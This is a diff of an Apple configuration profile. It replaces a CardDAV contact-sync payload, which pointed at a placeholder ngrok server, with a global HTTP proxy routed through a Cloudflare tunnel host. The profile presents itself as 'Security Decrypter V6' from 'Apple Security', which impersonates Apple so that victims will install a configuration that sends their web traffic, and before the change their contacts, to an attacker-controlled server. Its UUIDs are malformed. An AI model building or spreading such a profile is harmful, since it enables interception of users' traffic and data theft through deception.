@@ -1,28 +1,37 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
 <dict>
     <key>PayloadContent</key>
     <array>
         <dict>
             <key>PayloadType</key>
-            <string>com.apple.carddav.account</string>
+            <string>com.apple.proxy.http.global</string>
             <key>PayloadVersion</key>
             <integer>1</integer>
             <key>PayloadIdentifier</key>
-            <string>com.apple.contact.sync</string>
+            <string>com.apple.proxy.config</string>
             <key>PayloadUUID</key>
-            <string>UNIQUE-ID-12345</string>
-            <key>CardDAVAccountDescription</key>
-            <string>Security Sync Service</string>
-            <key>CardDAVHostName</key>
-            <string>YOUR-NGROK-OR-SERVER-URL</string> <key>CardDAVUsername</key>
-            <string>admin</string>
-            <key>CardDAVPassword</key>
-            <string>password</string>
-            <key>CardDAVUseSSL</key>
-            <true/>
+            <string>A1B2C3D4-E5F6-G7H8-I9J0-K1L2M3N4O5P6</string>
+            <key>ProxyType</key>
+            <string>Manual</string>
+            <key>ProxyServer</key>
+            <string>742299aa-6575-456b-a7db-fabc56a9bec6.cfargotunnel.com</string>
+            <key>ProxyServerPort</key>
+            <integer>443</integer>
         </dict>
     </array>
     <key>PayloadDisplayName</key>
-    <string>Security Patch V6</string>
+    <string>Security Decrypter V6</string>
+    <key>PayloadIdentifier</key>
+    <string>com.apple.security.update.v6</string>
+    <key>PayloadOrganization</key>
+    <string>Apple Security</string>
     <key>PayloadType</key>
     <string>Configuration</string>
+    <key>PayloadUUID</key>
+    <string>B2C3D4E5-F6G7-H8I9-J0K1-L2M3N4O5P6Q7</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
 </dict>
+</plist>
